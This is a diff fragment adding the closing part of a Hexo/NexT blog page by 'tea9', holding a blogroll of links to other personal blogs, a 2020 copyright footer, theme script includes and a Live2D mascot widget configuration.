+          <a href="https://www.xynh.ink/" title="https://www.xynh.ink/" rel="noopener" target="_blank">筱一</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cyto.top/" title="https://cyto.top/" rel="noopener" target="_blank">Cytosine</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://addcoder.com/" title="https://addcoder.com/" rel="noopener" target="_blank">新码农</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://qtfreet.com/" title="https://qtfreet.com/" rel="noopener" target="_blank">qtfreet00</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.appleos.xyz/" title="https://www.appleos.xyz/" rel="noopener" target="_blank">B.S.</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://eternalsakura13.com" title="https://eternalsakura13.com" rel="noopener" target="_blank">樱花</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="/Cracke-S-J.github.io" title="Cracke-S-J.github.io">ssj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://api-caller.com/" title="https://api-caller.com/" rel="noopener" target="_blank">智姐姐</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://lingze.xyz/" title="https://lingze.xyz/" rel="noopener" target="_blank">lingze</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://h4ck.org.cn/" title="http://h4ck.org.cn/" rel="noopener" target="_blank">obaby</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tea9</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+</html>
